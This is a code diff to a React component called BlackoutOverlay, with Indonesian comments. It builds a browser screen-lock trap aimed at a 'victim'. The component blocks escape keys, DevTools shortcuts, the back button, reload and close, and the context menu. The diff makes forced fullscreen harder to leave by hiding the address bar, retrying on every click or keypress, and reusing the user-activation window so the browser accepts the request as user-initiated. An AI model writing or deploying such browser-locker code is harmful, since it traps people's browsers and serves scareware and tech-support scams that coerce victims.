@@ -82,18 +82,32 @@ export default function BlackoutOverlay() {
   // Blokir semua jalan keluar: F11/F12/Esc/F10 & combo DevTools (Ctrl+Shift+I/J/C,
   // Ctrl+U/P/S), tombol back (history trap), reload/close (beforeunload),
   // contextmenu, scroll, seleksi. Setiap interaksi korban langsung balik
-  // fullscreen (<1 detik) — interval 250ms + setTimeout(0) di dalam jendela
-  // user-activation (~5 dtk) menjamin layar selalu penuh.
+  // fullscreen (<1 detik) — interval retry + event gesture (klik/ketik/tap)
+  // menjamin layar selalu penuh.
   useEffect(() => {
     if (!blacked) return;
 
+    // Flag anti-stack: jangan tumpuk requestFullscreen bertubi-tubi (bikin browser
+    // throttle). Satu request jalan, sisanya nunggu event gesture berikutnya.
+    let fsPending = false;
     const enter = () => {
       try {
-        if (document.fullscreenEnabled && !document.fullscreenElement) {
-          document.documentElement.requestFullscreen?.().catch(() => {});
-        }
+        if (document.fullscreenElement || fsPending) return;
+        const el = document.documentElement;
+        if (typeof el.requestFullscreen !== 'function') return;
+        // navigationUI: 'hide' — sembunyikan address bar di fullscreen.
+        fsPending = true;
+        const p = el.requestFullscreen({ navigationUI: 'hide' });
+        p.then(
+          () => {
+            fsPending = false;
+          },
+          () => {
+            fsPending = false;
+          }
+        );
       } catch {
-        /* noop */
+        fsPending = false;
       }
     };
 
@@ -106,6 +120,8 @@ export default function BlackoutOverlay() {
       if (blocked) {
         e.preventDefault();
         e.stopPropagation();
+        // setTimeout(0) masih di dalam jendela user-activation (~5 dtk) —
+        // request fullscreen tetap dianggap "pengguna meminta".
         window.setTimeout(enter, 0);
       }
       enter();
